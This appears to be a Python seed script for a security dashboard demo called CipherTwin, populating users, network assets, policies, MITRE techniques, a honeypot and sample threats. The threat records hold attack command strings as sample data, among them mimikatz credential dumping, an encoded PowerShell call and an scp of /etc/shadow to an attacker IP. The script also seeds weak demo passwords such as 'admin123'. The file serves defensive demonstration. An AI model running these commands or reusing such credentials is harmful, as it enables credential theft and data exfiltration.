"""Idempotent seed data for the CipherTwin demo.

Creates users (admin + analyst), a realistic digital twin, default policies,
honeytokens, a few historical risk decisions and threats.
"""
import json
import random
from datetime import datetime, timedelta, timezone

from app.core.security import hash_password
from app.db.session import SessionLocal, engine, Base
from app.models import (
    AuditLog, Honeytoken, Policy, PolicyImprovement, RiskDecision, RiskFactor,
    TelemetryEvent, Threat, ThreatTechnique, TwinNode, TwinRelationship, User,
)


from sqlalchemy import text


def init_schema():
    Base.metadata.create_all(bind=engine)
    try:
        with engine.connect() as conn:
            # Check telemetry_events columns
            res = conn.execute(text("PRAGMA table_info(telemetry_events)")).fetchall()
            cols_tel = [r[1] for r in res]
            if cols_tel and "mitre_technique" not in cols_tel:
                conn.execute(text("ALTER TABLE telemetry_events ADD COLUMN mitre_technique VARCHAR"))
            if cols_tel and "mitre_tactic" not in cols_tel:
                conn.execute(text("ALTER TABLE telemetry_events ADD COLUMN mitre_tactic VARCHAR"))

            # Check decoy_sessions columns
            res_decoy = conn.execute(text("PRAGMA table_info(decoy_sessions)")).fetchall()
            cols_decoy = [r[1] for r in res_decoy]
            if cols_decoy and "fidelity" not in cols_decoy:
                conn.execute(text("ALTER TABLE decoy_sessions ADD COLUMN fidelity VARCHAR DEFAULT 'MEDIUM'"))
            if cols_decoy and "reason" not in cols_decoy:
                conn.execute(text("ALTER TABLE decoy_sessions ADD COLUMN reason TEXT"))
            if cols_decoy and "confidence" not in cols_decoy:
                conn.execute(text("ALTER TABLE decoy_sessions ADD COLUMN confidence FLOAT DEFAULT 0.85"))
            if cols_decoy and "mode" not in cols_decoy:
                conn.execute(text("ALTER TABLE decoy_sessions ADD COLUMN mode VARCHAR DEFAULT 'SIMULATED'"))
            if cols_decoy and "persona" not in cols_decoy:
                conn.execute(text("ALTER TABLE decoy_sessions ADD COLUMN persona VARCHAR"))
            if cols_decoy and "banner" not in cols_decoy:
                conn.execute(text("ALTER TABLE decoy_sessions ADD COLUMN banner TEXT"))

            # Check honeytokens columns
            res_ht = conn.execute(text("PRAGMA table_info(honeytokens)")).fetchall()
            cols_ht = [r[1] for r in res_ht]
            if cols_ht and "last_triggered_at" not in cols_ht:
                conn.execute(text("ALTER TABLE honeytokens ADD COLUMN last_triggered_at DATETIME"))
            if cols_ht and "triggered_by" not in cols_ht:
                conn.execute(text("ALTER TABLE honeytokens ADD COLUMN triggered_by VARCHAR"))
            if cols_ht and "alert_severity" not in cols_ht:
                conn.execute(text("ALTER TABLE honeytokens ADD COLUMN alert_severity VARCHAR DEFAULT 'critical'"))

            conn.commit()
    except Exception as e:
        import logging
        logging.getLogger("ciphertwin.seed").warning("Schema migration notice: %s", e)


def seed_users(db):
    if db.query(User).count():
        return
    db.add_all([
        User(username="admin",
             email="admin@ciphertwin.local",
             full_name="Cipher Admin",
             hashed_password=hash_password("admin123"),
             role="admin"),
        User(username="analyst",
             email="analyst@ciphertwin.local",
             full_name="Sarah Mitchell",
             hashed_password=hash_password("analyst123"),
             role="analyst"),
        User(username="soc_lead",
             email="lead@ciphertwin.local",
             full_name="Marcus Chen",
             hashed_password=hash_password("lead123"),
             role="analyst"),
    ])
    db.commit()


USERS = [
    ("u-alice", "Alice Nguyen", "IT Operations", "HQ – US", "alice.nguyen"),
    ("u-bob", "Bob Martinez", "Finance", "HQ – US", "bob.martinez"),
    ("u-carol", "Carol Singh", "Engineering", "Branch – UK", "carol.singh"),
    ("u-david", "David Kowalski", "Sales", "Remote – DE", "david.kowalski"),
    ("u-emma", "Emma Tanaka", "Engineering", "Remote – JP", "emma.tanaka"),
    ("u-frank", "Frank O'Neill", "HR", "Branch – UK", "frank.oneill"),
    ("u-grace", "Grace Patel", "Security", "HQ – US", "grace.patel"),
    ("u-henry", "Henry Silva", "R&D", "Remote – BR", "henry.silva"),
    ("u-iris", "Iris Larsen", "Marketing", "Remote – DE", "iris.larsen"),
    ("u-jack", "Jack Reyes", "Support", "Branch – UK", "jack.reyes"),
    ("u-zoe", "Zoe Mercer", "Contractor", "Remote – RU", "zoe.mercer"),
]


DEVICES = [
    ("d-laptop-001", "Alice's MacBook Pro", "laptop", "10.10.20.11", "HQ – US", "IT Operations", "macOS 14", "online", 92, "medium", "managed"),
    ("d-laptop-002", "Bob's ThinkPad X1", "laptop", "10.10.20.12", "HQ – US", "Finance", "Windows 11", "online", 88, "high", "managed"),
    ("d-laptop-003", "Carol's Dell XPS", "laptop", "10.10.30.21", "Branch – UK", "Engineering", "Ubuntu 22.04", "online", 90, "high", "managed"),
    ("d-laptop-004", "David's Surface Pro", "tablet", "10.10.40.31", "Remote – DE", "Sales", "Windows 11", "online", 78, "medium", "managed"),
    ("d-laptop-005", "Emma's iMac", "desktop", "10.10.50.41", "Remote – JP", "Engineering", "macOS 14", "online", 85, "high", "managed"),
    ("d-laptop-006", "Frank's Latitude", "laptop", "10.10.30.22", "Branch – UK", "HR", "Windows 10", "online", 72, "high", "legacy"),
    ("d-laptop-007", "Grace's SecureBook", "laptop", "10.10.20.13", "HQ – US", "Security", "Tails OS", "online", 96, "critical", "hardened"),
    ("d-laptop-008", "Henry's Custom Rig", "desktop", "10.10.60.51", "Remote – BR", "R&D", "Arch Linux", "online", 83, "high", "managed"),
    ("d-laptop-009", "Iris's Yoga Slim", "laptop", "10.10.40.32", "Remote – DE", "Marketing", "Windows 11", "online", 80, "low", "managed"),
    ("d-laptop-010", "Jack's Chromebook", "laptop", "10.10.30.23", "Branch – UK", "Support", "ChromeOS", "online", 75, "low", "managed"),
    ("d-server-001", "FS-01 File Server", "server", "10.20.10.11", "HQ – US", "IT Operations", "Windows Server 2019", "online", 95, "critical", "production"),
    ("d-server-002", "Auth Service", "server", "10.20.10.12", "HQ – US", "Security", "Ubuntu 22.04", "online", 97, "critical", "production"),
    ("d-server-003", "Mail Relay", "server", "10.20.10.13", "HQ – US", "IT Operations", "Debian 12", "online", 90, "high", "production"),
    ("d-server-004", "Build Runner CI", "server", "10.20.10.14", "HQ – US", "Engineering", "Ubuntu 22.04", "online", 92, "high", "production"),
    ("d-server-005", "VPN Gateway", "server", "10.20.10.15", "HQ – US", "Security", "pfSense", "online", 95, "critical", "production"),
    ("d-db-001", "Customer DB (Primary)", "database", "10.30.10.11", "HQ – US", "Engineering", "PostgreSQL 16", "online", 96, "critical", "production"),
    ("d-db-002", "Analytics Warehouse", "database", "10.30.10.12", "HQ – US", "Finance", "Snowflake", "online", 92, "critical", "production"),
    ("d-db-003", "HR Records", "database", "10.30.10.13", "HQ – US", "HR", "MySQL 8", "online", 90, "critical", "production"),
    ("d-app-001", "Customer Portal", "application", "10.40.10.11", "HQ – US", "Engineering", "React", "online", 90, "high", "production"),
    ("d-app-002", "Internal Wiki", "application", "10.40.10.12", "HQ – US", "IT Operations", "Confluence", "online", 88, "medium", "production"),
    ("d-app-003", "Finance Dashboard", "application", "10.40.10.13", "HQ – US", "Finance", "PowerBI", "online", 89, "high", "production"),
    ("d-app-004", "Ticketing System", "application", "10.40.10.14", "HQ – US", "Support", "Jira", "online", 87, "medium", "production"),
    ("d-iot-001", "Boardroom Printer", "iot", "10.50.10.11", "HQ – US", "IT Operations", "Embedded Linux", "online", 70, "low", "iot"),
    ("d-iot-002", "Lobby Camera", "iot", "10.50.10.12", "HQ – US", "Security", "Embedded Linux", "online", 80, "medium", "iot"),
]


def seed_twin(db):
    # Ensure honeypot decoy node exists in Digital Twin
    hp = db.query(TwinNode).filter(TwinNode.id == "decoy-ssh-01").first()
    if not hp:
        hp = TwinNode(
            id="decoy-ssh-01",
            label="🪤 SSH Cowrie Honeypot",
            type="honeypot",
            ip_address="10.20.10.99",
            location="DMZ – Honeypot Subnet",
            department="Deception Network",
            status="online",
            trust_score=10.0,
            risk_score=85.0,
            sensitivity="high",
            os="Cowrie Linux Honeypot",
            tags="honeypot,decoy,dmz,ssh,cowrie",
        )
        db.add(hp)
        db.flush()

        srv = db.query(TwinNode).filter(TwinNode.type == "server").first()
        if srv:
            db.add(TwinRelationship(
                source_id=srv.id,
                target_id="decoy-ssh-01",
                relation="traps",
                weight=1.0,
                description="Honeypot Decoy Trap",
            ))
        db.commit()

    if db.query(TwinNode).filter(TwinNode.type == "user").count():
        return

    user_nodes = []
    for uid, label, dept, loc, _uname in USERS:
        node = TwinNode(
            id=uid, label=label, type="user",
            ip_address=f"10.10.{random.randint(20, 60)}.{random.randint(11, 60)}",
            location=loc, department=dept,
            status="online", trust_score=random.uniform(70, 95),
            risk_score=0.0, sensitivity="medium", os="—", tags="employee",
        )
        db.add(node)
        user_nodes.append(node)

    for did, label, dtype, ip, loc, dept, os_name, status, trust, sensitivity, tag in DEVICES:
        node = TwinNode(
            id=did, label=label, type=dtype, ip_address=ip, location=loc,
            department=dept, status=status, trust_score=trust,
            risk_score=0.0, sensitivity=sensitivity, os=os_name, tags=tag,
        )
        db.add(node)

    db.flush()

    # Relationships: users use devices
    for uid, _, _, _, _ in USERS:
        device_id = random.choice([d[0] for d in DEVICES if d[2] in ("laptop", "desktop", "tablet")])
        db.add(TwinRelationship(source_id=uid, target_id=device_id, relation="uses",
                                weight=1.0, description="Primary workstation"))
    # Users access applications
    app_ids = [d[0] for d in DEVICES if d[2] == "application"]
    db_ids = [d[0] for d in DEVICES if d[2] == "database"]
    srv_ids = [d[0] for d in DEVICES if d[2] == "server"]
    for uid, _, dept, _, _ in USERS:
        # Each user accesses a few applications
        for app_id in random.sample(app_ids, k=min(3, len(app_ids))):
            db.add(TwinRelationship(source_id=uid, target_id=app_id, relation="accesses",
                                    weight=0.8, description=f"via {dept} role"))
    # Apps host on servers
    for app_id in app_ids:
        host = random.choice(srv_ids)
        db.add(TwinRelationship(source_id=app_id, target_id=host, relation="hosts",
                                weight=1.0, description="Application deployment"))
    # Databases connect to servers
    for db_id in db_ids:
        host = random.choice(srv_ids)
        db.add(TwinRelationship(source_id=db_id, target_id=host, relation="connects_to",
                                weight=1.0, description="Database server"))
    # Servers trust each other
    for i, s1 in enumerate(srv_ids):
        for s2 in srv_ids[i + 1:]:
            db.add(TwinRelationship(source_id=s1, target_id=s2, relation="trusts",
                                    weight=0.6, description="Internal service mesh"))
    db.commit()


POLICIES = [
    ("Require MFA for sensitive apps",
     "Deny access to high-sensitivity resources without an MFA challenge.",
     "deny_if:resource.sensitivity>=high AND mfa==false", 100, 1.0, 0.08, 0.04),
    ("Block impossible travel",
     "Reject sessions where geolocation jumps faster than physically possible.",
     "deny_if:location.anomaly==impossible_travel", 95, 1.0, 0.05, 0.02),
    ("Restrict after-hours admin actions",
     "Flag privilege escalations outside business hours.",
     "restricted_if:event==privilege_escalation AND time_off_hours==true", 90, 0.9, 0.10, 0.06),
    ("Quarantine unknown devices",
     "Treat devices with missing posture telemetry as untrusted.",
     "deny_if:device.trust<40", 85, 1.1, 0.07, 0.03),
    ("Throttle failed logins",
     "Apply step-up auth after 3 consecutive failures.",
     "restricted_if:event==failed_login AND count(window=10m)>=3", 80, 0.8, 0.06, 0.05),
    ("Detect lateral movement",
     "Flag cross-host SSH/SMB traffic from a single principal.",
     "deny_if:event==lateral_movement AND targets>2(window=5m)", 92, 1.0, 0.04, 0.02),
    ("Data exfiltration guard",
     "Restrict bulk transfers to non-corporate destinations.",
     "deny_if:event==data_exfiltration AND dest.category==external", 98, 1.2, 0.03, 0.01),
    ("USB device control",
     "Require approval before removable media access.",
     "restricted_if:event==usb_insertion AND device.trust<80", 75, 0.7, 0.12, 0.08),
]


def seed_policies(db):
    if db.query(Policy).count():
        return
    from app.models.policy import PolicyRule, PolicyVersion
    import json as _json

    for name, desc, rule, prio, weight, fp, fn in POLICIES:
        p = Policy(
            name=name, description=desc, rule=rule, priority=prio,
            enabled=1, weight=weight, false_positive_rate=fp, false_negative_rate=fn,
        )
        db.add(p)
        db.flush()

        # Seed structured rule condition
        cond_field = "risk_threshold" if "risk" in rule else ("device_trust" if "device" in rule else "event_type")
        cond_val = "60" if "60" in rule else ("40" if "40" in rule else "sensitive")
        action = "deny" if "deny" in rule else "restricted"
        db.add(PolicyRule(
            policy_id=p.id,
            condition_field=cond_field,
            operator="<" if "<" in rule else (">" if ">" in rule else "=="),
            condition_value=cond_val,
            action=action,
        ))

        # Seed initial version snapshot
        db.add(PolicyVersion(
            policy_id=p.id,
            version_number=1,
            snapshot=_json.dumps(p.to_dict()),
            created_by="system_init",
        ))

    db.commit()


MITRE_TECHNIQUES = [
    ("T1078", "Valid Accounts", "Initial Access", "Use of valid credentials to gain initial access."),
    ("T1110", "Brute Force", "Credential Access", "Password guessing attacks."),
    ("T1059", "Command and Scripting Interpreter", "Execution", "Abuse of command interpreters."),
    ("T1059.001", "PowerShell", "Execution", "Adversary abuse of PowerShell."),
    ("T1083", "File and Directory Discovery", "Discovery", "Enumerate files and directories."),
    ("T1087", "Account Discovery", "Discovery", "Enumerate local or domain accounts."),
    ("T1021", "Remote Services", "Lateral Movement", "Use of remote services for lateral movement."),
    ("T1021.004", "SSH", "Lateral Movement", "Adversary use of SSH."),
    ("T1003", "OS Credential Dumping", "Credential Access", "Steal credentials from the OS."),
    ("T1041", "Exfiltration Over C2 Channel", "Exfiltration", "Steal data over existing C2 channel."),
    ("T1567", "Exfiltration Over Web Service", "Exfiltration", "Exfiltration to cloud storage."),
    ("T1486", "Data Encrypted for Impact", "Impact", "Ransomware-style encryption."),
    ("T1490", "Inhibit System Recovery", "Impact", "Deletion of backups."),
    ("T1098", "Account Manipulation", "Persistence", "Maintain access via account changes."),
    ("T1543", "Create or Modify System Process", "Persistence", "Persistence via services."),
    ("T1071", "Application Layer Protocol", "Command and Control", "C2 over standard protocols."),
    ("T1190", "Exploit Public-Facing Application", "Initial Access", "Exploits against internet-exposed apps."),
]


def seed_mitre(db):
    if db.query(ThreatTechnique).count():
        return
    for tid, name, tactic, desc in MITRE_TECHNIQUES:
        db.add(ThreatTechnique(id=tid, name=name, tactic=tactic, description=desc))
    db.commit()


def seed_history(db):
    if db.query(TelemetryEvent).count():
        return

    rnd = random.Random(7)
    users = [u[0] for u in USERS]
    devices = [d[0] for d in DEVICES]
    targets = [d[0] for d in DEVICES if d[2] in ("server", "database", "application")]
    event_types = [
        ("login", "success", []),
        ("file_access", "success", []),
        ("network_request", "success", []),
        ("failed_login", "failure", ["credential_issue"]),
        ("powershell", "success", []),
        ("privilege_escalation", "success", ["sensitive_resource"]),
        ("lateral_movement", "success", ["lateral_movement"]),
        ("data_exfiltration", "success", ["sensitive_resource"]),
        ("ssh_attempt", "success", []),
        ("abnormal_process", "success", []),
    ]
    now = datetime.now(timezone.utc)
    for i in range(220):
        ts = now - timedelta(minutes=rnd.randint(0, 60 * 24))
        user = rnd.choice(users)
        device = rnd.choice(devices)
        et, status, ind = rnd.choice(event_types)
        if rnd.random() < 0.05:
            ind = list(ind) + ["impossible_travel"]
        db.add(TelemetryEvent(
            timestamp=ts, user_id=user, device_id=device,
            target_id=rnd.choice(targets),
            event_type=et,
            location=rnd.choice(["HQ – US", "Branch – UK", "Remote – DE", "Remote – JP", "Tor Exit Node"]),
            ip_address=f"{rnd.randint(10, 220)}.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}",
            status=status, risk_indicators=json.dumps(ind),
            raw=json.dumps({"seed": True}),
        ))
    db.commit()


def seed_threats(db):
    if db.query(Threat).count():
        return
    db.add_all([
        Threat(actor_name="Crimson Viper", username="u-bob",
               ip_address="185.220.101.42", risk_score=88.5,
               severity="critical",
               techniques=json.dumps(["T1110", "T1059.001", "T1003", "T1041"]),
               commands=json.dumps(["mimikatz.exe sekurlsa::logonpasswords",
                                    "powershell -enc SQBFAFgAIAAo...",
                                    "scp /etc/shadow attacker@185.220.101.42"]),
               description="Suspected insider with credential theft chain.",
               status="active"),
        Threat(actor_name="Phantom Owl", username="u-david",
               ip_address="45.155.205.233", risk_score=72.0,
               severity="high",
               techniques=json.dumps(["T1078", "T1021.004", "T1567"]),
               commands=json.dumps(["ssh -i ~/.ssh/id_rsa admin@db-replica",
                                    "curl -X POST https://pastebin.com/api/api_post.php"]),
               description="External account compromise over anonymous network.",
               status="active"),
        Threat(actor_name="Shadow Lynx", username="u-emma",
               ip_address="203.0.113.45", risk_score=64.0,
               severity="high",
               techniques=json.dumps(["T1059", "T1083"]),
               commands=json.dumps(["find / -name '*.xlsx' -size +1M",
                                    "python3 -c 'import os; os.system(\"id\")'"]),
               description="Discovery phase following suspicious remote session.",
               status="contained"),
    ])
    db.commit()


def seed_decision_history(db):
    if db.query(RiskDecision).count():
        return
    rnd = random.Random(11)
    users = [u[0] for u in USERS]
    devices = [d[0] for d in DEVICES]
    targets = [d[0] for d in DEVICES if d[2] in ("server", "database", "application")]
    now = datetime.now(timezone.utc)
    samples = []
    for _ in range(60):
        risk = rnd.uniform(5, 95)
        decision = "allow" if risk < 30 else ("restricted" if risk < 60 else ("deceive" if risk < 85 else "deny"))
        samples.append((risk, decision))
    for risk, decision in samples:
        ts = now - timedelta(minutes=rnd.randint(0, 60 * 24))
        decision_row = RiskDecision(
            timestamp=ts, telemetry_id=None,
            user_id=rnd.choice(users), device_id=rnd.choice(devices),
            resource_id=rnd.choice(targets),
            risk_score=round(risk, 2), decision=decision,
            confidence=round(rnd.uniform(60, 99), 2),
            summary=f"Historical {decision} decision",
        )
        db.add(decision_row)
        db.flush()
        for name, weight in [
            ("Identity Confidence", 0.20),
            ("Behaviour Deviation", 0.30),
            ("Device Posture", 0.20),
            ("Location Anomaly", 0.10),
            ("Previous History", 0.20),
        ]:
            score = min(100, risk * rnd.uniform(0.6, 1.2))
            db.add(RiskFactor(decision_id=decision_row.id, name=name, weight=weight,
                              score=round(score, 2), contribution=round(score * weight, 2),
                              description=f"{name} signal"))
    db.commit()


def ensure_risky_demo_user(db):
    """Keep one deterministic high-risk user visible in the dashboard demo."""
    user_id = "u-zoe"
    now = datetime.now(timezone.utc)
    if not db.query(TwinNode).filter(TwinNode.id == user_id).first():
        db.add(TwinNode(
            id=user_id, label="Zoe Mercer", type="user", ip_address="10.10.61.44",
            location="Remote – RU", department="Contractor", status="online",
            trust_score=18, risk_score=94, sensitivity="high", os="—", tags="contractor,watchlist",
        ))
        db.flush()

    if db.query(RiskDecision).filter(RiskDecision.user_id == user_id).count() == 0:
        for offset, risk, decision in [
            (8, 94.0, "deny"),
            (5, 91.0, "deceive"),
            (2, 96.0, "deny"),
        ]:
            decision_row = RiskDecision(
                timestamp=now - timedelta(minutes=offset), telemetry_id=None,
                user_id=user_id, device_id="d-laptop-009", resource_id="d-db-001",
                risk_score=risk, decision=decision, confidence=98.0,
                summary="Demo: impossible travel and bulk data access detected",
            )
            db.add(decision_row)
            db.flush()
            for name, weight, score in [
                ("Identity Confidence", 0.20, 82),
                ("Behaviour Deviation", 0.30, 98),
                ("Device Posture", 0.20, 91),
                ("Location Anomaly", 0.10, 100),
                ("Previous History", 0.20, 96),
            ]:
                db.add(RiskFactor(
                    decision_id=decision_row.id, name=name, weight=weight,
                    score=score, contribution=round(score * weight, 2),
                    description=f"Demo signal: {name}",
                ))

    if not db.query(RiskDecision).filter(
        RiskDecision.user_id == "u-alice",
        RiskDecision.timestamp >= now - timedelta(hours=24),
    ).first():
        db.add(RiskDecision(
            timestamp=now - timedelta(minutes=3),
            telemetry_id=None, user_id="u-alice", device_id="d-laptop-001",
            resource_id="d-app-001", risk_score=12.0, decision="allow",
            confidence=96.0, summary="Demo: managed device and expected HQ access",
        ))
        db.commit()


def seed_audit(db):
    if db.query(AuditLog).count():
        return
    now = datetime.now(timezone.utc)
    db.add_all([
        AuditLog(timestamp=now - timedelta(hours=4), actor="admin",
                 action="login", target="dashboard", severity="info",
                 ip_address="10.10.20.11"),
        AuditLog(timestamp=now - timedelta(hours=2), actor="system",
                 action="decoy_activated", target="ssh", severity="warning",
                 details="Threat=Crimson Viper; risk=88.5", ip_address="185.220.101.42"),
        AuditLog(timestamp=now - timedelta(hours=1), actor="analyst",
                 action="policy_view", target="policies", severity="info"),
        AuditLog(timestamp=now - timedelta(minutes=20), actor="system",
                 action="optimization_run", target="QAOA", severity="info",
                 details="Reduced FP by 15%"),
    ])
    db.commit()


def seed_policy_history(db):
    if db.query(PolicyImprovement).count():
        return
    now = datetime.now(timezone.utc)
    db.add_all([
        PolicyImprovement(timestamp=now - timedelta(days=2),
                          algorithm="QAOA-Sim (p=3)",
                          before_score=42.5, after_score=31.7,
                          before_fp=0.085, after_fp=0.062,
                          before_fn=0.041, after_fn=0.029,
                          duration_ms=480, iterations=36,
                          summary="Initial calibration reduced overall cost.",
                          changes=json.dumps([{"policy": "Block impossible travel",
                                               "weight_before": 0.95,
                                               "weight_after": 1.05,
                                               "delta": 0.1}])),
        PolicyImprovement(timestamp=now - timedelta(days=1),
                          algorithm="QAOA-Sim (p=3)",
                          before_score=35.0, after_score=26.4,
                          before_fp=0.072, after_fp=0.054,
                          before_fn=0.038, after_fn=0.024,
                          duration_ms=520, iterations=42,
                          summary="Tuned policy weights after first attack wave.",
                          changes=json.dumps([{"policy": "Data exfiltration guard",
                                               "weight_before": 1.1,
                                               "weight_after": 1.25,
                                               "delta": 0.15}])),
    ])
    db.commit()


def sync_twin_to_neo4j(db):
    """Sync all Digital Twin nodes and relationships from SQLite to Neo4j if available."""
    print("Checking Neo4j connection...")
    try:
        from app.services.neo4j_client import neo4j_client
        health = neo4j_client.check_health()
        if health.get("status") != "HEALTHY":
            print(f"Neo4j: UNAVAILABLE ({health.get('message', 'target machine actively refused connection')})")
            print("  Note: Neo4j service is offline. SQLite Digital Twin remains authoritative.")
            print("  To enable Neo4j, start the service (e.g. docker compose up -d neo4j).")
            return False

        print("Neo4j: CONNECTED (http://localhost:7474) - checking digital twin graph...")
        nodes = db.query(TwinNode).all()
        stats = neo4j_client.get_stats()
        if stats.get("total_nodes", 0) >= len(nodes):
            print(f"Neo4j: ALREADY SYNCED ({stats['total_nodes']} nodes, {stats['total_relationships']} relationships)")
            return True

        node_count = 0
        for node in nodes:
            label = "Asset"
            if node.type == "user":
                label = "User"
            elif node.type in ("laptop", "desktop", "tablet"):
                label = "Device"
            elif node.type == "server":
                label = "Server"
            elif node.type == "database":
                label = "Database"
            elif node.type == "application":
                label = "Application"
            elif node.type == "honeypot":
                label = "Decoy"

            props = {
                "label": node.label,
                "type": node.type,
                "ip_address": node.ip_address,
                "location": node.location,
                "department": node.department,
                "status": node.status,
                "trust_score": float(node.trust_score or 0),
                "risk_score": float(node.risk_score or 0),
                "sensitivity": node.sensitivity,
                "os": node.os,
                "tags": node.tags,
            }
            if node.type == "honeypot":
                props.update({
                    "is_honeypot": True,
                    "decoy_type": "ssh",
                    "technology": "Cowrie",
                    "protocol": "SSH/Telnet",
                })
            if neo4j_client.upsert_node(node.id, label, props):
                node_count += 1

        rels = db.query(TwinRelationship).all()
        rel_count = 0
        for rel in rels:
            rel_type = "CONNECTS_TO"
            if rel.relation == "uses":
                rel_type = "USES"
            elif rel.relation == "accesses":
                rel_type = "ACCESSES"
            elif rel.relation == "hosts":
                rel_type = "RUNS"
            elif rel.relation == "connects_to":
                rel_type = "CONNECTS_TO"
            elif rel.relation == "trusts":
                rel_type = "USES"
            elif rel.relation == "traps":
                rel_type = "AFFECTS"

            props = {
                "relation": rel.relation,
                "weight": float(rel.weight or 1.0),
                "description": rel.description or "",
            }
            if neo4j_client.upsert_relationship(rel.source_id, rel.target_id, rel_type, props):
                rel_count += 1

        print(f"Neo4j: SYNC COMPLETE ({node_count} nodes, {rel_count} relationships)")
        return True
    except Exception as e:
        print(f"Neo4j: Sync skipped due to error: {e}")
        return False


def run_all():
    init_schema()
    db = SessionLocal()
    try:
        seed_users(db)
        seed_twin(db)
        sync_twin_to_neo4j(db)
        seed_policies(db)
        seed_mitre(db)
        seed_history(db)
        seed_threats(db)
        seed_decision_history(db)
        ensure_risky_demo_user(db)
        seed_audit(db)
        seed_policy_history(db)
    finally:
        db.close()


if __name__ == "__main__":
    run_all()
    print("SEED OK")

